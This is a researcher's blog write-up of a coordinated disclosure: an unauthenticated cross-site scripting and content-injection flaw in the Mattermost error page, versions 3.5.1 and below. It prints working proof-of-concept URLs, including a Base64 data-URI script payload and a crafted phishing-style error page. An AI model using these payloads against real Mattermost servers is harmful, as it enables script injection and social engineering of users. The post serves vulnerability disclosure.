---
title: 'RCESEC-2016-012: Mattermost <= 3.5.1 Error Page Cross-Site Scripting / Content Injection'
categories:
- Advisory
- Exploit
---
I'm quite busy with bug bounties lately, but sometimes I still discover stuff, which might also be interesting for the rest of you ;-). So here's quick writeup about a quite [interesting vulnerability](https://docs.mattermost.com/administration/changelog.html) in the open source Slack-alternative [Mattermost](https://www.mattermost.org), which I have found in December last year and coordinated with the Mattermost team. You can also read about the full advisory [here](http://seclists.org/fulldisclosure/2017/Jan/51) - make sure you update your Mattermosts asap.

Mattermost versions 3.5.1 and below are vulnerable to an unauthenticated Cross-Site Scripting, which can be exploited by attackers to insert a Base64 encoded DATA URI in the return link on the Mattermost error page and thereby hide and execute JavaScript payloads. "Unfortunately" due to the presence of httpOnly, it's not possible to steal session tokens using this attack, however the rest of the attack vectors like redirecting users to malicious pages or exploit browser/plugin vulnerabilities is still possible.

A prepared link could look like the following:

{% highlight html %}
https://localhost/error?link=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
{% endhighlight %}

This inserts the value of the "link" parameter in the response body:

{% highlight html %}
<div class="error__container"><div class="error__icon"><i class="fa fa-exclamation-triangle"></i></div><h2>Error</h2><div><p>An error has occoured.</p>
</div><a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Back to Mattermost</a></div>
{% endhighlight %}

[![]({{ site.baseurl }}/assets/rcesec-2016-012_mattermost_error_xss-0.jpg)]({{ site.baseurl }}/assets/rcesec-2016-012_mattermost_error_xss-0.jpg)

But when you click on the link, which should pop up the Base64 payload, nothing happens and your browser debugger will show an error like the following:

{% highlight javascript %}
main.bce07c6….js:14 Uncaught DOMException: Failed to execute 'pushState' on 'History': A history state object with URL 'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=' cannot be created in a document with origin 'https://localhost' and URL 'https://localhost/error?link=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='.
    at n (https://localhost/static/main.bce07c6ce7c9f3d8aec2.js:16:14172)
    at https://localhost/static/main.bce07c6ce7c9f3d8aec2.js:16:16753
    at https://localhost/static/main.bce07c6ce7c9f3d8aec2.js:16:16584
    at i (https://localhost/static/main.bce07c6ce7c9f3d8aec2.js:48:1894)
    at Object.a [as loopAsync] (https://localhost/static/main.bce07c6ce7c9f3d8aec2.js:48:1933)
    at r (https://localhost/static/main.bce07c6ce7c9f3d8aec2.js:16:16438)
    at l (https://localhost/static/main.bce07c6ce7c9f3d8aec2.js:16:16626)
    at Object.c [as push] (https://localhost/static/main.bce07c6ce7c9f3d8aec2.js:16:16881)
    at Object.c [as push] (https://localhost/static/main.bce07c6ce7c9f3d8aec2.js:12:7881)
    at Object.s [as push] (https://localhost/static/main.bce07c6ce7c9f3d8aec2.js:10:4069)
rethrowCaughtError @ main.bce07c6….js:14
processEventQueue @ main.bce07c6….js:11
a @ main.bce07c6….js:55
handleTopLevel @ main.bce07c6….js:55
i @ main.bce07c6….js:56
perform @ main.bce07c6….js:11
batchedUpdates @ main.bce07c6….js:55
i @ main.bce07c6….js:9
dispatchEvent @ main.bce07c6….js:56
{% endhighlight %}

To be honest I haven't spend much time into analyzing this because it doesn't seem to be very auto-exploitable due to the origin mismatch, but luckily the same error page does also suffer from multiple other content injections, which in the end lead to a fully customizable error page. The other elements that are present on the error page like the title, the text of the link as well as the body message itself, can also be set via their corresponding GET parameters "title", "linkmessage" and "message":

{% highlight html %}
https://localhost/error?title=Unknown%20Error&link=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=&linkmessage=http://mattermost.org&message=Something%20went%20wrong%20with%20the%20provided%20link,%20open%20it%20with%20a%20right%20click%20instead!
{% endhighlight %}

Et voila, social engineer all the users!

[![]({{ site.baseurl }}/assets/rcesec-2016-012_mattermost_error_xss-1.jpg)]({{ site.baseurl }}/assets/rcesec-2016-012_mattermost_error_xss-1.jpg)
